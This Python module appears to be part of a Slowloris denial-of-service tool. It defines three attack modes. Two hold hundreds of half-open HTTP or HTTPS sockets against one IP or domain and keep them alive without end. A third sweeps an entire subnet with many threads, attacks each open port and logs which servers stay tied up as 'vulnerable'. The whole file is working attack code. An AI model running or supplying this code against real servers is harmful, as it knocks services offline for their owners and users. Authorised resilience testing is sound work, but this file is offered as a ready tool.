from __future__ import annotations
import logging
import socket
import time
from dataclasses import dataclass
from ipaddress import IPv4Network
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

from .sockets import (
    init_socket,
    iteration_keepalive,
    is_ip_reachable,
    is_port_open,
)

DEFAULT_SOCKETS = 150
DEFAULT_SLEEP = 15
DEFAULT_THREADS = 50
DEFAULT_ATTACK_SECONDS = 120
RESULT_FILE = "slowloris_results.txt"


@dataclass
class BaseOptions:
    sockets: int = DEFAULT_SOCKETS
    https: bool = False
    randua: bool = False
    sleeptime: int = DEFAULT_SLEEP


class Strategy:
    def execute(self) -> None:
        raise NotImplementedError


class SniperStrategy(Strategy):
    def __init__(self, ip: str, port: int, opts: BaseOptions):
        self.ip = ip
        self.port = port
        self.opts = opts

    def execute(self) -> None:
        logging.info(f"[SNIPER] {self.ip}:{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
        sock_list: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua)
            if s:
                sock_list.append(s)
        while True:
            try:
                logging.info(f"Sending keep-alive... ({len(sock_list)} active sockets)")
                iteration_keepalive(
                    sock_list, self.opts.sockets, self.ip, self.port,
                    self.opts.https, self.opts.randua, None, None
                )
                time.sleep(self.opts.sleeptime)
            except (KeyboardInterrupt, SystemExit):
                logging.info("Shutting down (Ctrl+C)…")
                break
            except Exception as e:
                logging.debug(f"Loop error: {e}")
        for s in sock_list:
            try:
                s.close()
            except Exception:
                pass


class DomainStrategy(Strategy):
    def __init__(self, host: str, ip: str, port: int, opts: BaseOptions):
        self.host = host
        self.ip = ip
        self.port = port
        self.opts = opts

    def execute(self) -> None:
        logging.info(
            f"[DOMAIN] {self.host} ({self.ip}):{self.port} | sockets={self.opts.sockets} | https={self.opts.https}")
        sock_list: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(self.ip, self.port, self.opts.https, self.opts.randua,
                            host_header=self.host, sni_name=self.host if self.opts.https else None)
            if s:
                sock_list.append(s)
        while True:
            try:
                logging.info(f"Sending keep-alive... ({len(sock_list)} active sockets)")
                iteration_keepalive(
                    sock_list, self.opts.sockets, self.ip, self.port,
                    self.opts.https, self.opts.randua,
                    host_header=self.host, sni_name=self.host if self.opts.https else None
                )
                time.sleep(self.opts.sleeptime)
            except (KeyboardInterrupt, SystemExit):
                logging.info("Shutting down (Ctrl+C)…")
                break
            except Exception as e:
                logging.debug(f"Loop error: {e}")
        for s in sock_list:
            try:
                s.close()
            except Exception:
                pass


class PitchforkStrategy(Strategy):
    def __init__(self, subnet: IPv4Network, ports: List[int], opts: BaseOptions,
                 duration_s: int = DEFAULT_ATTACK_SECONDS, max_threads: int = DEFAULT_THREADS):
        self.subnet = subnet
        self.ports = ports
        self.opts = opts
        self.duration_s = duration_s
        self.max_threads = max_threads

    def _test_target(self, ip: str, port: int) -> bool:
        logging.info(f"[+] Testing {ip}:{port} for {self.duration_s}s (sockets={self.opts.sockets})")
        sock_list: List[socket.socket] = []
        for _ in range(self.opts.sockets):
            s = init_socket(ip, port, self.opts.https, self.opts.randua)
            if s:
                sock_list.append(s)
        if len(sock_list) < self.opts.sockets:
            logging.info(f"[-] Could not create all {self.opts.sockets} sockets.")
            for s in sock_list:
                try:
                    s.close()
                except Exception:
                    pass
            return False
        start = time.time()
        total_recreated = 0
        while time.time() - start < self.duration_s:
            before = len(sock_list)
            iteration_keepalive(sock_list, self.opts.sockets, ip, port, self.opts.https, self.opts.randua, None, None)
            recreated = max(0, len(sock_list) - before)
            total_recreated += recreated
            logging.info(
                f"[{ip}:{port}] active={len(sock_list)}/{self.opts.sockets} | recreated_this_cycle={recreated}")
            time.sleep(10)
        for s in sock_list:
            try:
                s.close()
            except Exception:
                pass
        if total_recreated == 0:
            logging.info(f"[VULNERABLE] {ip}:{port} – kept 100% of sockets.")
            return True
        logging.info(f"[SAFE] {ip}:{port} – {total_recreated} sockets had to be recreated.")
        return False

    def _process_ip(self, ip: str) -> List[str]:
        findings: List[str] = []
        if not is_ip_reachable(ip):
            logging.info(f"[-] Inactive IP: {ip}")
            return findings
        for p in self.ports:
            if is_port_open(ip, p):
                if self._test_target(ip, p):
                    findings.append(f"[VULNERABLE] {ip}:{p}\n")
            else:
                logging.info(f"[-] Port {p} inactive on {ip}")
        return findings

    def execute(self) -> None:
        logging.info(
            f"[PITCHFORK] Subnet={self.subnet} | ports={self.ports} | sockets={self.opts.sockets} | https={self.opts.https} | duration={self.duration_s}s")
        results: List[str] = []
        with ThreadPoolExecutor(max_workers=self.max_threads) as ex:
            futures = {ex.submit(self._process_ip, str(ip)): str(ip) for ip in self.subnet}
            for fut in as_completed(futures):
                try:
                    results.extend(fut.result())
                except Exception as e:
                    logging.error(f"Error processing {futures[fut]}: {e}")
        if results:
            with open(RESULT_FILE, "w", encoding="utf-8") as f:
                f.writelines(results)
            logging.info(f"[+] Results saved to {RESULT_FILE}")
        else:
            logging.info("[+] No vulnerabilities found.")
